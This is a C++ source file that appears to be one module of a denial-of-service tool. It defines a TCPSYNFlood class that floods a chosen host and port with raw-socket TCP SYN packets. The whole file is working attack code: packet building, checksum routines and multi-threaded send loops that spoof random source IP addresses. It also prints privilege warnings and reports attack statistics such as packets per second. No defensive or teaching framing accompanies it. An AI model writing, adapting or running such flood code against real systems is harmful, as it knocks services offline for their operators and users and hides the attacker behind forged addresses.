#include "tcp_syn.hpp"
#include "config.hpp"

#include <sstream>
#include <cstring>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSE_SOCKET closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define CLOSE_SOCKET ::close
#endif

TCPSYNFlood::TCPSYNFlood(const std::string& target, int duration, int threads, int port,
                         std::function<void(const std::string&)> callback)
    : target_(target)
    , duration_(duration)
    , num_threads_(threads)
    , port_(port)
    , callback_(callback)
{
}

TCPSYNFlood::~TCPSYNFlood() {
    stop();
}

std::string TCPSYNFlood::resolve_host(const std::string& hostname) {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname.c_str(), nullptr, &hints, &res) != 0 || !res) {
        return "";
    }

    char ip[INET_ADDRSTRLEN];
    auto* addr = reinterpret_cast<struct sockaddr_in*>(res->ai_addr);
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    return std::string(ip);
}

std::string TCPSYNFlood::random_ip() {
    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<int> dist(1, 254);
    return std::to_string(dist(rng)) + "." +
           std::to_string(dist(rng)) + "." +
           std::to_string(dist(rng)) + "." +
           std::to_string(dist(rng));
}

uint16_t TCPSYNFlood::checksum(const void* data, int len) {
    const uint16_t* buf = reinterpret_cast<const uint16_t*>(data);
    uint32_t sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *reinterpret_cast<const uint8_t*>(buf);
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return static_cast<uint16_t>(~sum);
}

void TCPSYNFlood::worker(int /*worker_id*/) {
    std::string dst_ip = resolve_host(target_);
    if (dst_ip.empty()) {
        failed_packets_++;
        return;
    }

    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<uint16_t> port_dist(1024, 65535);
    std::uniform_int_distribution<uint32_t> seq_dist(0, UINT32_MAX);

#ifdef _WIN32
    // Windows raw sockets require admin and have restrictions
    // Use IPPROTO_RAW
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock == INVALID_SOCKET) {
        if (callback_) {
            callback_("[!] Raw socket creation failed - requires Administrator privileges");
        }
        failed_packets_++;
        return;
    }

    // Enable IP_HDRINCL
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char*)&one, sizeof(one)) < 0) {
        CLOSE_SOCKET(sock);
        failed_packets_++;
        return;
    }
#else
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        if (callback_) {
            callback_("[!] Raw socket creation failed - requires root privileges");
        }
        failed_packets_++;
        return;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        CLOSE_SOCKET(sock);
        failed_packets_++;
        return;
    }
#endif

    struct sockaddr_in dest{};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(static_cast<uint16_t>(port_));
    inet_pton(AF_INET, dst_ip.c_str(), &dest.sin_addr);

    while (!stop_flag_.load()) {
        // Spoofed source IP
        std::string src_ip = random_ip();

        // Packet buffer
        char packet[sizeof(IPHeader) + sizeof(TCPHeader)];
        std::memset(packet, 0, sizeof(packet));

        auto* ip_hdr = reinterpret_cast<IPHeader*>(packet);
        auto* tcp_hdr = reinterpret_cast<TCPHeader*>(packet + sizeof(IPHeader));

        // Fill IP header
        ip_hdr->ihl_ver = 0x45;           // IPv4, header length = 5 (20 bytes)
        ip_hdr->tos = 0;
        ip_hdr->total_length = htons(sizeof(IPHeader) + sizeof(TCPHeader));
        ip_hdr->id = htons(static_cast<uint16_t>(rng() & 0xFFFF));
        ip_hdr->frag_offset = 0;
        ip_hdr->ttl = 255;
        ip_hdr->protocol = 6;             // TCP
        ip_hdr->checksum = 0;
        inet_pton(AF_INET, src_ip.c_str(), &ip_hdr->src_addr);
        ip_hdr->dst_addr = dest.sin_addr.s_addr;

        // IP checksum
        ip_hdr->checksum = checksum(ip_hdr, sizeof(IPHeader));

        // Fill TCP header
        tcp_hdr->src_port = htons(port_dist(rng));
        tcp_hdr->dst_port = htons(static_cast<uint16_t>(port_));
        tcp_hdr->seq_num = htonl(seq_dist(rng));
        tcp_hdr->ack_num = 0;
        tcp_hdr->data_offset = 0x50;      // data offset = 5 (20 bytes), no options
        tcp_hdr->flags = 0x02;            // SYN flag
        tcp_hdr->window = htons(65535);
        tcp_hdr->checksum = 0;
        tcp_hdr->urgent_ptr = 0;

        // TCP checksum with pseudo header
        PseudoHeader pseudo{};
        pseudo.src_addr = ip_hdr->src_addr;
        pseudo.dst_addr = ip_hdr->dst_addr;
        pseudo.placeholder = 0;
        pseudo.protocol = 6;  // TCP
        pseudo.tcp_length = htons(sizeof(TCPHeader));

        // Build pseudo header + TCP header for checksum
        char checksum_buf[sizeof(PseudoHeader) + sizeof(TCPHeader)];
        std::memcpy(checksum_buf, &pseudo, sizeof(PseudoHeader));
        std::memcpy(checksum_buf + sizeof(PseudoHeader), tcp_hdr, sizeof(TCPHeader));

        tcp_hdr->checksum = checksum(checksum_buf, sizeof(checksum_buf));

        // Send the packet
        int result = sendto(sock, packet, sizeof(packet), 0,
                           (struct sockaddr*)&dest, sizeof(dest));

        if (result > 0) {
            packets_sent_++;
        } else {
            failed_packets_++;
        }
    }

    CLOSE_SOCKET(sock);
}

std::map<std::string, std::string> TCPSYNFlood::run() {
    stop_flag_.store(false);
    packets_sent_.store(0);
    failed_packets_.store(0);

    if (callback_) {
        callback_("Starting TCP SYN Flood on " + target_ + ":" + std::to_string(port_));
        callback_("[!] This attack requires root/administrator privileges for raw sockets");
    }

    auto start_time = std::chrono::steady_clock::now();

    // Launch worker threads
    for (int i = 0; i < num_threads_; i++) {
        threads_.emplace_back(&TCPSYNFlood::worker, this, i);
    }

    // Monitor duration
    while (!stop_flag_.load()) {
        auto elapsed = std::chrono::steady_clock::now() - start_time;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration_) {
            stop_flag_.store(true);
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    // Join threads
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();

    auto end_time = std::chrono::steady_clock::now();
    auto total_seconds = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
    if (total_seconds == 0) total_seconds = 1;

    uint64_t sent = packets_sent_.load();
    uint64_t failed = failed_packets_.load();

    std::map<std::string, std::string> stats;
    stats["attack_type"] = "TCP SYN Flood";
    stats["target"] = target_ + ":" + std::to_string(port_);
    stats["duration"] = std::to_string(total_seconds) + "s";
    stats["threads"] = std::to_string(num_threads_);
    stats["packets_sent"] = std::to_string(sent);
    stats["failed_packets"] = std::to_string(failed);
    stats["packets_per_second"] = std::to_string(sent / static_cast<uint64_t>(total_seconds));

    return stats;
}

void TCPSYNFlood::stop() {
    stop_flag_.store(true);
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();
}
